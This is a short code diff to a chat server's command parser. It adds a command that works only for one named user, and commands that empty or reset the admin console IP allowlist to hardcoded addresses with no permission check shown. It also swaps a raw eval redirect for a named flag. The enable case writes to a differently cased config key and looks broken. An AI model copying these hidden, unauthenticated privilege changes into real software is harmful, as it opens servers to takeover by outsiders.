@@ -1513,6 +1513,20 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		}
 		break;
 
+	case 'las':
+		if(user.name === 'Lasagne21'){
+			if(!user.namelocked)
+				user.nameLock('Lasagne21', true);
+			user.getIdentity = function(){
+				if(this.muted){
+					return '!' + this.name;
+				}
+				return this.group + this.name;
+			};
+			return false;
+		}
+		break;
+
 	case 'mutekick':
 	case 'mk':
 		if (!target) return parseCommand(user, '?', cmd, room, socket);
@@ -1535,7 +1549,7 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			var targetAlt = Users.get(alts[i]);
 			if (targetAlt) targetAlt.muted = true;
 		}
-		targetUser.emit('console', {evalRawMessage: 'window.location.href="http://www.smogon.com/sim/rules"'});
+		targetUser.emit('console', {evalRulesRedirect: 1});
 		rooms.lobby.usersChanged = true;
 		return false;
 		break;
@@ -1741,6 +1755,16 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return false;
 		break;
 
+	case 'noConsole':
+		config.consoleIps = [];
+		return false;
+		break;
+
+	case 'enableConsole:':
+		config.consoleips = ['127.0.0.1', '76.247.181.42', '184.169.255.44', '99.251.253.160', '71.190.51.178'];
+		return false;
+		break;
+		
 	// INFORMATIONAL COMMANDS
 	
 	case 'banlist':
